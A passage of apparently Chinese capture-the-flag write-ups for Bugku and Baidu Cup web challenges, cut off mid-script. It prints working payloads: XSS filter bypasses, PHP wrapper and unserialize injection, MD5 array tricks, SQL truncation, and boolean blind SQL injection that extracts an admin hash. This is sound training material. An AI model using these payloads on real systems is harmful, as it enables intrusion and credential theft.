class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;;</span><br><span class="line">$url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line"></span><br><span class="line">for ($i=0; $i &lt; 40; $i++) &#123; </span><br><span class="line"></span><br><span class="line">$url = $url1.$i.$url2;</span><br><span class="line"></span><br><span class="line">$contents = file_get_contents($url);</span><br><span class="line">echo $contents;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;</span><br><span class="line">url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line">for i in range(40):</span><br><span class="line">   url=url1+str(i)+url2</span><br><span class="line">   ans = requests.get(url)</span><br><span class="line">   print(ans.text)</span><br></pre></td></tr></table></figure></p><p>脚本运行之后得到的源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0); </span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); </span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; </span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); </span><br><span class="line">$file_list = array( </span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;, </span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;, </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; </span><br><span class="line">$file_list[2]=&apos;keys.php&apos;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123; </span><br><span class="line">$fa = file($file); </span><br><span class="line">echo $fa[$line]; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>看到源码之后，当存在<code>cookie:margin</code>且等于<code>margin</code>的时候，<br>才能读keys.php的源码,<br>拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/61360232.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h2><p>题目提示必须包含<code>alert(_key_)</code>，所以先提交:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>但是没有给出flag，查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/71611277.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到此时s里的内容<code>&lt;</code> <code>&gt;</code>已经被转义成了<code>&amp;lt</code> <code>&amp;gt</code>,<br>所以如果要得到flag，必须先绕过过滤：<br>Unicode编码绕过,<a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml" target="_blank" rel="noopener">查看原理</a></p><p>用<code>\u003c</code>和<code>\u003e</code>来代替<code>&lt;</code> <code>&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure><p>替换之后没有弹窗，但是在源代码里可以看到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/83372728.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这题做了处理，不能用简单的<code>alert</code>来弹窗，但是也有其他方法，<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>上来发现没什么提示，看了看源代码，<br>提示了<code>1p.html</code>，访问之后。。。到了bugku的论坛，<br>估计是有个跳转，<br>直接拿bp抓包访问即可：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/8227629.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>做到这就有种感觉了，这题纯粹是来坑人的,<br>将中间那段代码先复制到记事本(待会方便改)，<br>对编码熟悉一点的人应该都知道该怎么做了，<code>base64</code>转码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ</span><br></pre></td></tr></table></figure></p><p>为什么是这一段，因为base64里是不会出现百分号的，<br>base64解码：<a href="http://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">附上链接</a><br>解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure></p><p>ctf做多了就知道，这又是一段URL编码，<br>这个时候比较坑的一点是，<br>你得把这段url编码放到之前的编码里再URL解码<br>URL编码：<a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">附上链接</a><br>解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var Words = &quot;&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--&quot;;if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;no no no no no no no&apos;;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;==--&gt;&quot;</span><br></pre></td></tr></table></figure></p><p>直接看代码，访问<code>f4l2a3g.txt</code><br>得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/92842859.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>一开始题目没给什么提示，看了看源代码：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/54563244.jpg" alt="" title="" class="">                <p></p>            </figure><p>一道代码审计题，首先是需要存在<code>user</code>变量，并且<code>user</code>变量的值需要等于<code>welcome to the bugkuctf</code>，<br>但是又不能直接提交<code>txt</code>等于<code>welcome to the bugkuctf</code>，因为用了<code>file_get_contents</code>，<br>所以只能用<a href="https://cherrygk.github.io/2018/07/12/phpagree/" target="_blank" rel="noopener">php伪协议</a>了,<br>这里用到的是<code>php://input</code>：</p><ul><li>访问请求的原始数据的只读流，可以接收到post的数据</li></ul><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/89781081.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到已经绕过了<code>file_get_contents</code>，所以现在需要读到<code>hint.php</code>的源码，<br>但是可以看到被包含了，但是被服务器解析了，所以现在需要<code>php://filter</code>：</p><ul><li>将代码过滤成<code>base64</code>展现出来</li></ul><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/62718348.jpg" alt="" title="" class="">                <p></p>            </figure><p>解码出来之后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>是一个<code>Flag类</code>，里面是一个<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a><code>tostring</code>，官方文档:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br></pre></td></tr></table></figure><p>大概意思就是当对象被当成了字符串时echo时，执行这个方法</p><p>再用同样的方法获取到index.php的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到已经通过了第一个判断，接下来是需要绕过第二个判断，<br>而且按照题目的解释，可以知道flag就在<code>flag.php</code>里，但是代码里匹配了<code>flag</code>，<br>所以直接用伪协议读取<code>flag.php</code>是行不通的了，<br>所以现在看到第三个参数，<code>password</code>,代码里有一个函<a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a>,对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>现在需要做的是将<code>Flag类</code>实例化，使<code>flag.php</code>文件能够成功包含<br>本地代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ff = new Flag;</span><br><span class="line">$ff-&gt;file = &apos;flag.php&apos;;</span><br><span class="line">echo serialize($ff);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码就是实例化了Flag类并且将其中的<code>flie</code>等于<code>flag.php</code>，并且序列化，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到一个这样的序列串，将<code>password</code>等于这个串即可</p><p>最终的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">welcome to the bugkuctf</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/68106823.jpg" alt="" title="" class="">                <p></p>            </figure><p>这题把伪协议这块锻炼了一遍，是个很好的练习题</p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>这题直接就扫到了<code>flag.txt,</code>应该是题目坏了</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/89087165.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>这题无非就是匹配一个正则，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>照着其中的表达式一步一步写就行了,不会正则的可以参考<a href="http://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">正则表达式</a>,<br>引用网上一位大佬写的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表达式直接写出来的字符串直接利用，如key</span><br><span class="line">“.”代表任意字符</span><br><span class="line">“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束</span><br><span class="line">“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束</span><br><span class="line">[a-z]代表a-z中的任意一个字符</span><br><span class="line">[[:punct:]]代表任意一个字符，包括各种符号，记得是符号</span><br><span class="line">/i代表大小写不敏感</span><br><span class="line">&#123;4-7&#125;代表[0-9]中数字连续出现的次数是4-7次</span><br><span class="line">\s匹配任意的空白符</span><br><span class="line">\d 匹配数字</span><br><span class="line">\b 匹配单词的开始或结束</span><br></pre></td></tr></table></figure><p>我的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web10/?id=keykkeykkkkkkey:/k/kkeyk,</span><br></pre></td></tr></table></figure></p><h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>一进题目就是<code>PHP是世界上最好的语言</code>,代码审计无误了<br>看一下源代码，有一个跳转，得到了一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目首先给了提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:SQL约束攻击</span><br></pre></td></tr></table></figure></p><p>CSDN上一篇文章讲的很好，<a href="https://blog.csdn.net/qq_32400847/article/details/54137747" target="_blank" rel="noopener">参考链接</a>,<br>简单来说，这题就是先注册一个admin加很多空格如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin+++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure></p><p>此时数据库里插入的数据也是这个，但是在查询语句，也就是<code>select</code>语句中，字符串末尾的空格符将会被删除,<br>就是刚刚注册的<code>&#39;admin                                                &#39;</code>与<code>&#39;admin&#39;</code>一样，<br>所以这题思路就出来了，注册一个<code>admin</code>后面跟上很多空格的用户，然后用正常使用admin登陆，密码填写刚刚注册使用的密码，直接登陆进管理员，得到flag</p><p>附上查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT username FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;</span><br><span class="line">              AND password=&apos;$password&apos; &quot;</span><br></pre></td></tr></table></figure><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>这题很简单，将消息头改一下就行了：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/62885294.jpg" alt="" title="" class="">                <p></p>            </figure><h1 id="Web-2-点此链接"><a href="#Web-2-点此链接" class="headerlink" title="Web(2)点此链接"></a><a href="http://www.cherrygk.cf/2018/06/06/bugku2" target="_blank" rel="noopener">Web(2)点此链接</a></h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web-1&quot;&gt;&lt;a href=&quot;#Web-1&quot; class=&quot;headerlink&quot; title=&quot;Web(1)&quot;&gt;&lt;/a&gt;Web(1)&lt;/h1&gt;&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>“百度杯”CTF比赛 登陆 writeup</title>
    <link href="http://yoursite.com/2018/05/31/logindft/"/>
    <id>http://yoursite.com/2018/05/31/logindft/</id>
    <published>2018-05-31T11:17:46.000Z</published>
    <updated>2018-05-31T11:22:04.986Z</updated>
    
    <content type="html"><![CDATA[<p>打开页面是一个登陆框:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>什么都发现不了，<br>但是这个表单中用户名密码的<code>class</code>有点奇怪，先记着</p><p>随便输入用户名和密码<br>同时打开burpsuite抓包：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用万能密码试试：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>提示密码错误，但是当提交<code>or &#39;1&#39; = &#39;2</code>时，显示的是：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>猜测是个布尔型的盲注</p><p>试了很多函数不行，最后看的wp，用的是正则表达式：<br>username=<figure class="highlight plain"><figcaption><span>or user() regexp '^a' %23```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">我们用burpsuite进行盲注：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)</span><br><span class="line"></span><br><span class="line">然后字典选择`a~z,0~9,(),_`</span><br><span class="line">用的都是表的常用字符,然后开始爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是`u`，</span><br><span class="line">一直持续下去可以发现这个列的名字就是前面表单用户名的`class`</span><br><span class="line">然后密码也是，就不仔细说了，</span><br><span class="line">接下来爆列:</span><br><span class="line">将`user()`替换成`user_n3me`：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)</span><br><span class="line"></span><br><span class="line">继续爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是b，重复这个过程就行了</span><br><span class="line">最终得到</span><br><span class="line">用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`</span><br><span class="line">md5解密之后是:`adminqwe123666`</span><br><span class="line"></span><br><span class="line">一个个爆破可以比较麻烦，这里给出c26大佬的py脚本：</span><br></pre></td></tr></table></figure></p><p>import string<br>import requests</p><p>url = ‘<a href="http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;" target="_blank" rel="noopener">http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;</a><br>headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}<br>payloads = 